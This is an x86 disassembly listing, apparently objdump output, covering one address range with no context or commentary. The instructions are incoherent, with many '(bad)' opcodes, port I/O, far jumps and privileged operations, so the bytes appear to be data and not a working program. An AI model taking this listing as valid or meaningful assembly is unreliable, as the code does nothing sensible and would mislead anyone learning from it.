  41f231:	ret    0xc7be
  41f234:	repz fild WORD PTR [edi]
  41f237:	adc    cl,ch
  41f239:	mov    esp,ds
  41f23b:	mov    esp,DWORD PTR [ebx+edx*2-0x158007ba]
  41f242:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f243:	jae    0x41f2a2
  41f245:	imul   eax,DWORD PTR [ecx],0xffffffd2
  41f248:	jmp    0x6bc4:0x83371bc0
  41f24f:	leave  
  41f250:	push   0x100b036e
  41f255:	adc    al,0xf
  41f257:	or     esp,ebx
  41f259:	mov    ecx,0xcb0a24d
  41f25e:	cmp    BYTE PTR [ecx],bl
  41f260:	and    ebp,DWORD PTR [edi-0x15]
  41f263:	adc    al,0x0
  41f265:	cmp    edi,ebx
  41f267:	and    ch,bl
  41f269:	xor    BYTE PTR [eax],cl
  41f26b:	ja     0x41f2c5
  41f26d:	outs   dx,DWORD PTR ds:[esi]
  41f26e:	addr16 dec ebp
  41f270:	sar    DWORD PTR [ebp+0x7c03680d],cl
  41f276:	sbb    al,0x2c
  41f278:	outs   dx,DWORD PTR ds:[esi]
  41f279:	or     eax,0x12e228d1
  41f27e:	aaa    
  41f27f:	push   esp
  41f280:	dec    eax
  41f281:	popa   
  41f282:	xchg   esp,eax
  41f283:	ins    BYTE PTR es:[edi],dx
  41f284:	mov    fs,WORD PTR [ecx]
  41f286:	cdq    
  41f287:	and    esi,DWORD PTR [edi-0x74]
  41f28a:	cmp    DWORD PTR [ecx-0x3757cdf4],edx
  41f290:	add    DWORD PTR [edi],ecx
  41f292:	sub    eax,0x7222428b
  41f297:	movzx  esp,WORD PTR [ebp-0x47ac205a]
  41f29e:	push   cs
  41f29f:	push   cs
  41f2a0:	push   esp
  41f2a1:	dec    ecx
  41f2a2:	dec    BYTE PTR fs:[ebp-0x28]
  41f2a6:	inc    ebp
  41f2a7:	add    eax,0x85c7972
  41f2ac:	sbb    DWORD PTR [edi+eiz*8],edx
  41f2af:	jg     0x41f29d
  41f2b1:	and    al,0x4f
  41f2b3:	cmp    BYTE PTR [ecx+edx*4-0x14],0x24
  41f2b8:	adc    al,0xed
  41f2ba:	add    al,0x9
  41f2bc:	out    0x6e,al
  41f2be:	jo     0x41f249
  41f2c0:	push   esp
  41f2c1:	pop    ds
  41f2c2:	addr16 inc edi
  41f2c4:	pcmpeqw mm6,QWORD PTR [eax-0x11]
  41f2c8:	push   edi
  41f2c9:	or     DWORD PTR [eax+0x7c7cc943],edx
  41f2cf:	and    al,0xc5
  41f2d1:	sbb    DWORD PTR [edx+0xa7ceee4],0x73
  41f2d8:	dec    edi
  41f2d9:	rcl    dh,0x43
  41f2dc:	push   ss
  41f2dd:	aam    0xf9
  41f2df:	mov    BYTE PTR [ebp-0x6f],dl
  41f2e2:	fdivr  st,st(5)
  41f2e4:	and    cl,dh
  41f2e6:	inc    esi
  41f2e7:	repz ret 
  41f2e9:	arpl   si,sp
  41f2eb:	or     BYTE PTR [esi+0xb8a8815],0x77
  41f2f2:	push   cs
  41f2f3:	jmp    0xb0733438
  41f2f8:	inc    ecx
  41f2f9:	or     BYTE PTR ds:0x740119b5,bl
  41f2ff:	fmul   DWORD PTR [ebx+edi*1]
  41f302:	dec    ebx
  41f303:	xchg   esp,eax
  41f304:	adc    eax,esi
  41f306:	stos   BYTE PTR es:[edi],al
  41f307:	ds enter 0xc2f0,0x8
  41f30c:	cwde   
  41f30d:	aad    0xc3
  41f30f:	xchg   ecx,eax
  41f310:	repz jl 0x41f31a
  41f313:	inc    esi
  41f314:	inc    eax
  41f315:	in     al,dx
  41f316:	add    al,0x7
  41f318:	dec    eax
  41f319:	gs add al,0xc
  41f31c:	mov    dl,0x8
  41f31e:	or     al,0xea
  41f320:	adc    BYTE PTR [ecx+ecx*1],cl
  41f323:	bound  esi,QWORD PTR [edi]
  41f325:	sbb    DWORD PTR [ebp+0x1f],edx
  41f328:	xor    esp,DWORD PTR [eax+0x3ba43b16]
  41f32e:	fmul   DWORD PTR ds:0x6082c96a
  41f334:	push   ebx
  41f335:	aas    
  41f336:	ficom  DWORD PTR [edi]
  41f338:	xchg   esp,eax
  41f339:	mov    BYTE PTR ds:0x5b672531,al
  41f33f:	and    BYTE PTR [ebx-0x31],0x4d
  41f343:	repnz and al,0xa4
  41f346:	in     eax,dx
  41f347:	inc    eax
  41f348:	jecxz  0x41f354
  41f34a:	adc    al,0x30
  41f34c:	test   DWORD PTR ds:0x3e34f10f,0x263080db
  41f356:	in     al,0x0
  41f358:	cdq    
  41f359:	add    al,0x4
  41f35b:	or     BYTE PTR [edi-0x47dd65eb],dl
  41f361:	adc    al,0x34
  41f363:	xor    al,0x8
  41f365:	mov    cl,0x90
  41f367:	jne    0x41f379
  41f369:	std    
  41f36a:	sbb    BYTE PTR [esp+edx*1],dh
  41f36d:	sbb    BYTE PTR [edx],al
  41f36f:	adc    eax,0xcb3448b3
  41f374:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f375:	loope  0x41f339
  41f377:	or     ch,BYTE PTR [eax+edi*8+0x78]
  41f37b:	(bad)  
  41f37c:	sbb    al,0xab
  41f37e:	(bad)  
  41f37f:	scas   eax,DWORD PTR es:[edi]
  41f380:	inc    edi
  41f381:	add    al,0x8d
  41f383:	inc    edi
  41f384:	push   ds
  41f385:	ror    BYTE PTR [ebx-0x38c91ef3],0x1e
  41f38c:	add    eax,0xecd8eb1d
  41f391:	test   ah,ah
  41f393:	push   esp
  41f394:	jl     0x41f331
  41f396:	push   esp
  41f397:	add    BYTE PTR [esi-0x3a],0x46
  41f39b:	adc    BYTE PTR [ecx],al
  41f39d:	ret    0x582c
  41f3a0:	popa   
  41f3a1:	retf   0x792b
  41f3a4:	dec    DWORD PTR [esi]
  41f3a6:	mov    al,0x4d
  41f3a8:	lea    edx,[eax+edx*2+0x868f5f9]
  41f3af:	dec    ebp
  41f3b0:	test   DWORD PTR [edi],ebx
  41f3b2:	and    esi,esi
  41f3b4:	std    
  41f3b5:	in     eax,dx
  41f3b6:	jl     0x41f3ce
  41f3b8:	inc    ebp
  41f3b9:	xor    edi,edi
  41f3bb:	or     eax,0x477bf7d7
  41f3c0:	dec    ebp
  41f3c1:	jne    0x41f3b0
  41f3c3:	or     BYTE PTR [ecx],al
  41f3c5:	and    DWORD PTR [ecx],ecx
  41f3c7:	xchg   edi,eax
  41f3c8:	stos   DWORD PTR es:[edi],eax
  41f3c9:	xchg   ebx,eax
  41f3ca:	addr16 inc edi
  41f3cc:	or     cl,BYTE PTR [eax]
  41f3ce:	pop    DWORD PTR [ebx-0xf57b140]
  41f3d4:	sbb    al,0x30
  41f3d6:	jae    0x41f3b3
  41f3d8:	or     ecx,DWORD PTR [ebp+0x270937e7]
  41f3de:	inc    esp
  41f3df:	and    eax,DWORD PTR [edi+0x5b]
  41f3e2:	xor    eax,0xbac70d0b
  41f3e7:	fcom   st(3)
  41f3e9:	arpl   WORD PTR [edi+0x60ed46d5],di
  41f3ef:	mov    al,BYTE PTR [ebx-0x5aeb3322]
  41f3f5:	js     0x41f44c
  41f3f7:	jne    0x41f466
  41f3f9:	and    al,0x3
  41f3fb:	mov    ds:0xcb6b12e8,eax
  41f400:	repz lds ebp,FWORD PTR [esi]
  41f403:	retf   0x2304
  41f406:	loopne 0x41f3f6
  41f408:	aam    0x35
  41f40a:	fldenv [eax]
  41f40c:	and    ebx,ebx
  41f40e:	out    dx,eax
  41f40f:	rcr    DWORD PTR [ecx],cl
  41f411:	in     al,dx
  41f412:	or     DWORD PTR [esi],esp
  41f414:	cmp    esp,DWORD PTR [eax-0x66]
  41f417:	out    dx,eax
  41f418:	mov    DWORD PTR [esi],edx
  41f41a:	loopne 0x41f43d
  41f41c:	test   BYTE PTR [edx+0x180b0446],bh
  41f422:	fmul   DWORD PTR [ebx]
  41f424:	stos   BYTE PTR es:[edi],al
  41f425:	add    al,0xc8
  41f427:	mov    ebp,edi
  41f429:	fcom   DWORD PTR [esi]
  41f42b:	add    eax,0x98b0366
  41f430:	dec    esi
  41f431:	xor    BYTE PTR [eax],dl
  41f433:	fmul   QWORD PTR [ebx-0x69245c01]
  41f439:	fild   DWORD PTR gs:[ecx-0x4a]
  41f43d:	dec    ebp
  41f43e:	or     al,0x5
  41f440:	or     BYTE PTR [eax],cl
  41f442:	or     al,0x4
  41f444:	lods   al,BYTE PTR ds:[esi]
  41f445:	add    al,0x88
  41f447:	fldcw  WORD PTR [ecx]
  41f449:	sub    eax,DWORD PTR [edx+0x10973319]
  41f44f:	fwait
  41f450:	out    dx,eax
  41f451:	retf   
  41f452:	out    dx,eax
  41f453:	mov    edi,gs
  41f455:	loopne 0x41f3e2
  41f457:	sar    BYTE PTR [edi+0x2340f450],1
  41f45d:	inc    ebp
  41f45e:	pushf  
  41f45f:	xchg   edx,eax
  41f460:	mov    ebx,0xca75fabf
  41f465:	lock add eax,0x2318088a
  41f46b:	inc    esi
  41f46c:	lea    ebx,[ecx-0x45]
  41f46f:	sub    BYTE PTR ds:0x5c76be88,bh
  41f475:	outs   dx,BYTE PTR ds:[esi]
  41f476:	or     eax,0x8efb7e14
  41f47b:	jle    0x41f4c8
  41f47d:	cld    
  41f47e:	mov    DWORD PTR [edx],ecx
  41f480:	jmp    0x41f40e
  41f482:	ret    
  41f483:	or     BYTE PTR [esi+0x75],cl
  41f486:	loope  0x41f49b
  41f488:	xor    al,0x8c
  41f48a:	or     BYTE PTR [esi+0x3a],al
  41f48d:	ret    
  41f48e:	add    ebp,esi
  41f490:	in     al,dx
  41f491:	inc    eax
  41f492:	sub    DWORD PTR [ecx+0x1e],eax
  41f495:	inc    esi
  41f496:	mov    eax,ds:0x6cbfc708
  41f49b:	cmp    eax,DWORD PTR [ebx]
  41f49d:	jne    0x41f4af
  41f49f:	mov    BYTE PTR [ebp-0x5],0x4a
  41f4a3:	dec    esp
  41f4a4:	aad    0x8d
  41f4a6:	jne    0x41f46d
  41f4a8:	loop   0x41f4b4
  41f4aa:	cmp    al,0xe6
  41f4ac:	adc    eax,0x230e0800
  41f4b1:	pop    edx
  41f4b2:	inc    ebx
  41f4b3:	mov    esi,0x34f48590
  41f4b8:	xor    BYTE PTR [ebx-0x5255f7f8],bh
  41f4be:	pop    es
  41f4bf:	add    DWORD PTR [edx+0x3b0873d7],eax
  41f4c5:	push   ds
  41f4c6:	pop    es
  41f4c7:	icebp  
  41f4c8:	push   esp
  41f4c9:	shl    BYTE PTR [ebp+0x6],1
  41f4cc:	call   DWORD PTR [edx]
  41f4ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4cf:	js     0x41f4d4
  41f4d1:	stos   BYTE PTR es:[edi],al
  41f4d2:	jne    0x41f510
  41f4d4:	mov    al,0xff
  41f4d6:	inc    eax
  41f4d7:	inc    esp
  41f4d8:	or     esi,DWORD PTR [ebx]
  41f4da:	leave  
  41f4db:	sbb    ah,al
  41f4dd:	push   ss
  41f4de:	mov    WORD PTR [esi+0x49e7c645],ds
  41f4e4:	xchg   DWORD PTR [ebp-0x30d7f54],ebx
  41f4ea:	or     al,al
  41f4ec:	rcl    DWORD PTR [ebx],cl
  41f4ee:	mov    esp,0xa5198775
  41f4f3:	add    eax,0xf7c084c
  41f4f8:	fisub  WORD PTR [edx-0x133b9418]
  41f4fe:	fsubp  st(6),st
  41f500:	icebp  
  41f501:	imul   edx,DWORD PTR [eax],0x7f
  41f504:	int3   
  41f505:	xor    eax,0x4bfff851
  41f50a:	std    
  41f50b:	jno    0x41f4fc
  41f50d:	ja     0x41f502
  41f50f:	jg     0x41f501
  41f511:	jge    0x41f52c
  41f513:	sub    eax,esi
  41f515:	mov    ecx,eax
  41f517:	shl    ecx,0x2
  41f51a:	lea    edx,[eax+esi*4]
  41f51d:	add    eax,0x38d1b044
  41f522:	inc    esi
  41f523:	xchg   edx,eax
  41f524:	fistp  WORD PTR [ebx]
  41f526:	mov    al,0x7a
  41f528:	mov    cl,0x2
  41f52a:	pop    ecx
  41f52b:	inc    ebp
  41f52c:	add    al,0xf0
  41f52e:	xlat   BYTE PTR ds:[ebx]
  41f52f:	into   
  41f530:	mov    bl,BYTE PTR [edi-0xf]
  41f533:	iret   
  41f534:	push   edx
  41f535:	xchg   esp,eax
  41f536:	push   eax
  41f537:	mov    DWORD PTR [eax+0x1],ebp
  41f53a:	test   al,0x50
  41f53c:	jns    0x41f540
  41f53e:	or     BYTE PTR [eax+0x62093056],ah
  41f544:	xchg   ebx,eax
  41f545:	adc    BYTE PTR [ecx+0x46],ah
  41f548:	mov    esi,0xe8e9e5b9
  41f54d:	int    0x0
  41f54f:	mov    bh,BYTE PTR [ebx]
  41f551:	fistp  QWORD PTR [ecx]
  41f553:	push   es
  41f554:	add    eax,0xf2120319
  41f559:	sbb    bl,BYTE PTR [esi]
  41f55b:	rol    BYTE PTR [edi],cl
  41f55d:	jno    0x41f5a6
  41f55f:	mov    eax,ds:0x98f1d5ce
  41f564:	cmp    BYTE PTR [esp+ebp*4+0x23f20422],0x2e
  41f56c:	sbb    al,0x64
  41f56e:	outs   dx,BYTE PTR ds:[esi]
  41f56f:	dec    esi
  41f570:	out    dx,al
  41f571:	inc    ebx
  41f572:	das    
  41f573:	add    al,0xb0
  41f575:	pop    ss
  41f576:	mov    al,ds:0x508b7d2e
  41f57b:	ss cli 
  41f57d:	inc    eax
  41f57e:	retf   0x85ca
  41f581:	push   eax
  41f582:	je     0x41f587
  41f584:	or     cl,0x74
  41f587:	rol    DWORD PTR [ebx],0xfd
  41f58a:	pop    eax
  41f58b:	fsubr  DWORD PTR [esi]
  41f58d:	xchg   ebp,eax
  41f58e:	jmp    0x41f5a1
  41f590:	adc    cl,BYTE PTR [eax]
  41f592:	mov    BYTE PTR [ecx+0x5605ebbb],bh
  41f598:	test   BYTE PTR [edi],bh
  41f59a:	add    eax,0x8bca0323
  41f59f:	ror    DWORD PTR [edx+0x7],1
  41f5a2:	push   ebp
  41f5a3:	ins    BYTE PTR es:[edi],dx
  41f5a4:	jl     0x41f5c7
  41f5a6:	jbe    0x41f593
  41f5a8:	add    DWORD PTR [ecx+0x3b],eax
  41f5ab:	nop
  41f5ac:	jge    0x41f580
  41f5ae:	(bad)  
  41f5af:	(bad)  [esi]
  41f5b1:	mov    al,BYTE PTR [ebx+edi*1]
  41f5b4:	pushf  
  41f5b5:	jne    0x41f5a9
  41f5b7:	or     al,0x75
  41f5b9:	cmp    eax,0x13c2fec9
  41f5be:	sub    dl,al
  41f5c0:	shr    DWORD PTR [ebx-0x2b],0xf2
  41f5c4:	sbb    cl,0x15
  41f5c7:	dec    esp
  41f5c8:	adc    edi,DWORD PTR [edx-0x75a2f67e]
  41f5ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f5cf:	xor    eax,0x73ecdfd1
  41f5d4:	fwait
  41f5d5:	xchg   edi,eax
  41f5d6:	or     BYTE PTR [ecx+0xd7ee7fe],al
  41f5dc:	sbb    BYTE PTR [edx-0x107f6064],dl
  41f5e2:	pushf  
  41f5e3:	(bad)  
  41f5e4:	cmovbe ecx,DWORD PTR [eax]
  41f5e7:	jmp    0x2019:0x7702e2c1
  41f5ee:	fsubr  DWORD PTR [ecx+ecx*2]
  41f5f1:	adc    al,0x13
  41f5f3:	fnstcw WORD PTR [esp+edi*4]
  41f5f6:	fld    DWORD PTR [ecx+0x727e485c]
  41f5fc:	mov    al,0x6a
  41f5fe:	or     ecx,DWORD PTR [esi+0x197ecb23]
  41f604:	mov    esp,es
  41f606:	and    BYTE PTR [ebx],0x6b
  41f609:	add    al,ah
  41f60b:	sub    ah,al
  41f60d:	pop    esi
  41f60e:	rcl    DWORD PTR [eax],0x75
  41f611:	mov    ds:0xfd8e9260,al
  41f616:	int3   
  41f617:	cmc    
  41f618:	mov    edi,0x8b4de816
  41f61d:	(bad)  
  41f61e:	sub    edi,ebp
  41f620:	jg     0x41f630
  41f622:	dec    edi
  41f623:	dec    edx
  41f624:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f625:	dec    ebp
  41f626:	inc    edi
  41f627:	jne    0x41f61c
  41f629:	or     bl,BYTE PTR [esi-0x54]
  41f62c:	push   es
  41f62d:	mov    DWORD PTR [ecx],esi
  41f62f:	out    dx,eax
  41f630:	or     DWORD PTR [ecx],0x5d710ac
  41f636:	pop    ebx
  41f637:	add    ch,BYTE PTR [ebp-0xf8c7f7c]
  41f63d:	dec    esp
  41f63e:	adc    al,0x42
  41f640:	inc    ecx
  41f641:	mov    eax,ds:0xc567b6cd
  41f646:	dec    edx
  41f647:	mov    al,ds:0x85f4dc3b
  41f64c:	sbb    al,0x21
  41f64e:	mov    cl,al
  41f650:	retf   
  41f651:	hlt    
  41f652:	sub    cl,BYTE PTR [esp+eax*4+0x3d0ad40]
  41f659:	add    DWORD PTR [eax],ecx
  41f65b:	mov    eax,0x31f40767
  41f660:	adc    al,0xf5
  41f662:	sub    al,0x7
  41f664:	inc    edi
  41f665:	xchg   esp,eax
  41f666:	inc    eax
  41f667:	xor    DWORD PTR [ecx-0x60],0xd
  41f66b:	in     al,0x2c
  41f66d:	mov    ecx,0xbb8936b2
  41f672:	(bad)  
  41f673:	je     0x41f635
  41f675:	add    dh,BYTE PTR [ecx]
  41f677:	ret    
  41f678:	daa    
  41f679:	cmp    BYTE PTR [eax+0x20],0x1
  41f67d:	cmp    DWORD PTR [ebp+0x6b],0x7ec042ec
  41f684:	add    BYTE PTR [eax+0x75],0xf
  41f688:	ud2    
  41f68a:	jmp    0x41f6aa
  41f68c:	daa    
  41f68d:	sbb    al,0xc1
  41f68f:	inc    esi
  41f690:	clc    
  41f691:	add    dh,BYTE PTR [ebp+0x15]
  41f694:	xor    BYTE PTR [ebx*1+0x607218e7],0x11
  41f69c:	xchg   BYTE PTR [ecx+0x1e9c28c7],ah
  41f6a2:	ret    
  41f6a3:	mov    ds:0xd8deaba2,eax
  41f6a8:	add    al,0x47
  41f6aa:	adc    dh,dh
  41f6ac:	xchg   ecx,eax
  41f6ad:	pop    ss
  41f6ae:	fwait
  41f6af:	ss pop ecx
  41f6b1:	xchg   edx,eax
  41f6b2:	inc    ebx
  41f6b3:	cmc    
  41f6b4:	and    edx,DWORD PTR [edx+0xc1962a0]
  41f6ba:	nop
  41f6bb:	add    esi,ebp
  41f6bd:	sub    cl,BYTE PTR [ebx-0x44]
  41f6c0:	inc    ecx
  41f6c1:	rcr    BYTE PTR [edx],0x6f
  41f6c4:	xchg   edx,eax
  41f6c5:	add    DWORD PTR [eax],edx
  41f6c7:	sbb    BYTE PTR [ecx],dl
  41f6c9:	nop
  41f6ca:	and    DWORD PTR [edx+eiz*4-0x2ecbafb8],eax
  41f6d1:	inc    ecx
  41f6d2:	xchg   edx,eax
  41f6d3:	jne    0x41f6e6
  41f6d5:	xlat   BYTE PTR ds:[ebx]
  41f6d6:	sbb    bl,BYTE PTR [ecx+0x55]
  41f6d9:	out    dx,al
  41f6da:	cmc    
  41f6db:	js     0x41f71c
  41f6dd:	jecxz  0x41f707
  41f6df:	mov    BYTE PTR [esp+ecx*4],bh
  41f6e2:	sbb    esi,esi
  41f6e4:	xor    bl,BYTE PTR ds:0xa7da84ea
  41f6ea:	sbb    eax,0x20b70695
  41f6ef:	push   cs
  41f6f0:	jne    0x41f68c
  41f6f2:	or     al,0xa1
  41f6f4:	mov    ds:0xb3ce801e,eax
  41f6f9:	xchg   dh,dh
  41f6fb:	dec    eax
  41f6fc:	mov    edx,0x1e5b06ec
  41f701:	sub    BYTE PTR [edx+0x3390bf0],0xcc
  41f708:	enter  0x4e76,0x85
  41f70c:	pop    ds
  41f70d:	hlt    
  41f70e:	clc    
  41f70f:	rol    DWORD PTR [eax+0x2cc03588],0xfa
  41f716:	push   ebp
  41f717:	and    esp,DWORD PTR [ebx-0x1a86af7e]
  41f71d:	or     bh,BYTE PTR [ecx+0x59]
  41f720:	mov    ebx,0x880339f6
  41f725:	mov    bl,0x56
  41f727:	mov    ds:0xd8849d6e,eax
  41f72c:	nop
  41f72d:	in     al,0xec
  41f72f:	cmp    DWORD PTR [ebx+ecx*4-0x523a804],ebp
  41f736:	into   
  41f737:	push   ss
  41f738:	ss cdq 
  41f73a:	in     eax,dx
  41f73b:	sahf   
  41f73c:	or     al,0xc7
  41f73e:	add    al,dl
  41f740:	(bad)
  41f744:	mov    si,0xe60c
  41f748:	pop    edx
  41f749:	jbe    0x41f779
  41f74b:	jbe    0x41f771
  41f74d:	xor    al,0xe
  41f74f:	ror    DWORD PTR [ebx],0xe2
  41f752:	or     DWORD PTR [edx+0x1602fec9],ecx
  41f758:	add    DWORD PTR [eax+0x1f],ebp
  41f75b:	or     edi,ecx
  41f75d:	test   DWORD PTR [edi+edi*8],0x461a3c37
  41f764:	jb     0x41f7c6
  41f766:	pop    es
  41f767:	xor    BYTE PTR [edx+edi*4+0x31581af4],cl
  41f76e:	mov    ds:0xa4ca76a,eax
  41f773:	or     BYTE PTR [esi],ah
  41f775:	out    dx,eax
  41f776:	iret   
  41f777:	nop
  41f778:	and    DWORD PTR [ecx-0x2e68f97c],edi
  41f77e:	cmc    
  41f77f:	pusha  
  41f780:	xor    BYTE PTR [eax+0x16],cl
  41f783:	dec    ebx
  41f784:	ins    BYTE PTR es:[edi],dx
  41f785:	adc    al,0xd5
  41f787:	push   ss
  41f788:	test   dl,ch
  41f78a:	clc    
  41f78b:	int    0x27
  41f78d:	aaa    
  41f78e:	mov    DWORD PTR [edi+0xb11935e],0x3a71bef9
  41f798:	pop    ds
  41f799:	mov    esp,0xcf2b38ba
  41f79e:	dec    ecx
  41f79f:	popa   
  41f7a0:	and    al,0x14
  41f7a2:	rol    BYTE PTR [ebx+ecx*2+0x2028f4bb],0xcf
  41f7aa:	add    BYTE PTR [edx+0x2bf8e85e],bl
  41f7b0:	mov    bl,0x43
  41f7b2:	push   es
  41f7b3:	cmp    edi,eax
  41f7b5:	rcl    BYTE PTR ds:0x1178f80e,1
  41f7bb:	cmc    
  41f7bc:	scas   al,BYTE PTR es:[edi]
  41f7bd:	mov    dh,al
  41f7bf:	mov    BYTE PTR ds:0xccdb3346,ch
  41f7c5:	inc    ecx
  41f7c6:	icebp  
  41f7c7:	out    dx,eax
  41f7c8:	push   0x16
  41f7ca:	cmp    bh,bh
  41f7cc:	push   edi
  41f7cd:	or     al,0xbf
  41f7cf:	or     eax,0xd188fbf1
  41f7d4:	add    DWORD PTR [esi],ebx
  41f7d6:	pop    edx
  41f7d7:	sbb    BYTE PTR [ebx+eax*2],bh
  41f7da:	cmp    al,0x3b
  41f7dc:	and    BYTE PTR [esp+edi*1],ch
  41f7df:	(bad)  
  41f7e0:	and    al,bh
  41f7e2:	adc    eax,0x838cf95e
  41f7e7:	loop   0x41f77e
  41f7e9:	adc    al,0xb6
  41f7eb:	clc    
  41f7ec:	xor    ah,dh
  41f7ee:	xchg   esp,eax
  41f7ef:	and    al,0x56
  41f7f1:	ret    0xf33d
  41f7f4:	cmp    DWORD PTR [edx+eax*1-0x66],0x5c
  41f7f9:	sbb    al,ch
  41f7fb:	adc    BYTE PTR [ebx-0x3],ch
  41f7fe:	dec    ebx
  41f7ff:	ss fs mov cl,0xbc
  41f803:	(bad)  
  41f804:	mov    cl,0x44
  41f806:	mov    esi,ebx
  41f808:	mov    al,BYTE PTR [esi-0x4a]
  41f80b:	pop    ss
  41f80c:	or     al,0xd7
  41f80e:	retf   
  41f80f:	mov    BYTE PTR [edx+0x4],al
  41f812:	or     BYTE PTR [edi],al
  41f814:	pop    es
  41f815:	push   0x64
  41f817:	sbb    DWORD PTR [ecx+0x6],ebx
  41f81a:	push   es
  41f81b:	add    eax,0xdf607205
  41f820:	adc    edx,0xcdad40bc
  41f826:	dec    eax
  41f827:	(bad)  
  41f828:	hlt    
  41f829:	inc    esi
  41f82a:	jecxz  0x41f7d6
  41f82c:	fs iret 
  41f82e:	xor    ah,ah
  41f830:	stos   BYTE PTR es:[edi],al
  41f831:	(bad)  
  41f832:	cld    
  41f833:	mov    edx,0xa810e264
  41f838:	mov    DWORD PTR [eax],esi
  41f83a:	fisub  WORD PTR [edi+0x51]
  41f83d:	jo     0x41f845
  41f83f:	outs   dx,DWORD PTR ds:[esi]
  41f840:	push   esi
  41f841:	jo     0x41f8b3
  41f843:	ja     0x41f8a6
  41f845:	fisttp WORD PTR [edi+0x5b]
  41f848:	sub    eax,0xc60e01b3
  41f84d:	mov    ebx,0x6fd91327
  41f852:	(bad)  
  41f854:	(bad)  
  41f855:	daa    
  41f856:	clc    
  41f857:	push   0xf3804ea0
  41f85c:	add    ebx,ebp
  41f85e:	adc    BYTE PTR [ecx],dl
  41f860:	fild   DWORD PTR [esi]
  41f862:	inc    ebp
  41f863:	test   BYTE PTR [ecx+0x2e],dh
  41f866:	lahf   
  41f867:	pop    ecx
  41f868:	ret    
  41f869:	adc    eax,0xc054c049
  41f86e:	jnp    0x41f7f2
  41f870:	xor    DWORD PTR [eax],ebp
  41f872:	jo     0x41f8d7
  41f874:	mov    edx,0x7551d50
  41f879:	imul   ebx,DWORD PTR [ecx-0x4],0x8
  41f87d:	add    ebp,DWORD PTR [esp+ecx*8+0x32b5e2f8]
  41f884:	sub    eax,0xd2d2a9c8
  41f889:	or     al,0xe0
  41f88b:	push   ecx
  41f88c:	jno    0x41f872
  41f88e:	xchg   ecx,eax
  41f88f:	(bad)  
  41f890:	push   0x30
  41f892:	pop    eax
  41f893:	nop
  41f894:	mov    bh,bh
  41f896:	clc    
  41f897:	leave  
  41f898:	js     0x41f828
  41f89a:	xor    DWORD PTR [esi+0x7],esi
  41f89d:	cmp    DWORD PTR [ecx+0x63640f1f],0x22f0ec90
  41f8a7:	in     al,dx
  41f8a8:	cli    
  41f8a9:	cmp    DWORD PTR [ecx-0x54d9576f],ebp
  41f8af:	cld    
  41f8b0:	push   DWORD PTR [eax-0x55]
  41f8b3:	popa   
  41f8b4:	add    al,0x1a
  41f8b6:	mov    DWORD PTR [ebp+0x3b],esi
  41f8b9:	nop
  41f8ba:	addr16 in al,0xa3
  41f8bd:	ins    BYTE PTR es:[edi],dx
  41f8be:	push   ds
  41f8bf:	xor    al,dh
  41f8c1:	cld    
  41f8c2:	stos   BYTE PTR es:[edi],al
  41f8c3:	add    esi,DWORD PTR [edx+0x2f50f071]
  41f8c9:	in     al,dx
  41f8ca:	push   ebp
  41f8cb:	in     al,dx
  41f8cc:	mov    edx,0xa71b428e
  41f8d1:	xor    DWORD PTR [eax],ebx
  41f8d3:	jl     0x41f8f6
  41f8d5:	rcl    DWORD PTR [eax+0x1],cl
  41f8d8:	push   esp
  41f8d9:	repz xor cl,BYTE PTR [edx+0x240fa4a]
  41f8e0:	push   ss
  41f8e1:	test   DWORD PTR [esi+eax*2],edx
  41f8e4:	jne    0x41f95d
  41f8e6:	mov    bl,0x42
  41f8e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f8e9:	nop
  41f8ea:	inc    edi
  41f8eb:	cli    
  41f8ec:	dec    eax
  41f8ed:	sar    BYTE PTR [ebx+ecx*4],0x60
  41f8f1:	adc    al,0x70
  41f8f3:	mov    dh,0xfa
  41f8f5:	sar    BYTE PTR [esi-0x3968db5b],1
  41f8fb:	inc    eax
  41f8fc:	ret    
  41f8fd:	pop    ebx
  41f8fe:	dec    esp
  41f8ff:	push   0x9bc0e900
  41f904:	xlat   BYTE PTR ds:[ebx]
  41f905:	loop   0x41f960
  41f907:	daa    
  41f908:	adc    BYTE PTR ds:0xf09b3f23,ch
  41f90e:	and    BYTE PTR [edi],ah
  41f910:	jmp    0x9c35fb82
  41f915:	pop    edi
  41f916:	sti    
  41f917:	mov    eax,0x1e4c2c96
  41f91c:	sti    
  41f91d:	xchg   esi,eax
  41f91e:	cs hlt 
  41f920:	repnz pusha 
  41f922:	cmp    ch,cl
  41f924:	or     DWORD PTR [ecx-0x1c],ecx
  41f927:	dec    eax
  41f928:	(bad)  
  41f929:	and    eax,0x55484063
  41f92e:	and    BYTE PTR [ebx+0x3bd26e7b],dh
  41f934:	jo     0x41f94b
  41f936:	jmp    0x9269:0x10c1849
  41f93d:	in     eax,0x20
  41f93f:	clc    
  41f940:	and    al,0x87
  41f942:	xchg   edx,eax
  41f943:	test   DWORD PTR [ebx],eax
  41f945:	leave  
  41f946:	sti    
  41f947:	popf   
  41f948:	sti    
  41f949:	mov    edi,0x1d56f07e
  41f94e:	xchg   esi,eax
  41f94f:	mov    al,0x7b
  41f951:	in     eax,dx
  41f952:	mov    bh,0xa1
  41f954:	xchg   DWORD PTR [eax+0x48],esp
  41f957:	dec    ebx
  41f958:	inc    ebp
  41f959:	cld    
  41f95a:	sbb    esp,edi
  41f95c:	sbb    BYTE PTR [ecx],al
  41f95e:	jl     0x41f961
  41f960:	cdq    
  41f961:	sbb    al,0xe4
  41f963:	xchg   edi,eax
  41f964:	jl     0x41f8e9
  41f966:	and    BYTE PTR [eiz*2-0x327749c],bh
  41f96d:	pusha  
  41f96e:	adc    BYTE PTR ds:0x18e32090,cl
  41f974:	xchg   ecx,eax
  41f975:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f976:	push   0xffffff88
  41f978:	loopne 0x41f900
  41f97a:	pop    ebx
  41f97b:	fwait
  41f97c:	nop
  41f97d:	push   ds
  41f97e:	std    
  41f97f:	xor    esp,ecx
  41f981:	adc    al,0x18
  41f983:	mov    ebp,0xcd93acdb
  41f988:	push   es
  41f989:	popf   
  41f98a:	in     al,0xfd
  41f98c:	dec    esp
  41f98d:	jne    0x41f935
  41f98f:	ror    DWORD PTR [esi-0x2f],1
  41f992:	jp     0x41f9c6
  41f994:	inc    esi
  41f995:	(bad)  
  41f996:	push   eax
  41f997:	cmp    al,0x46
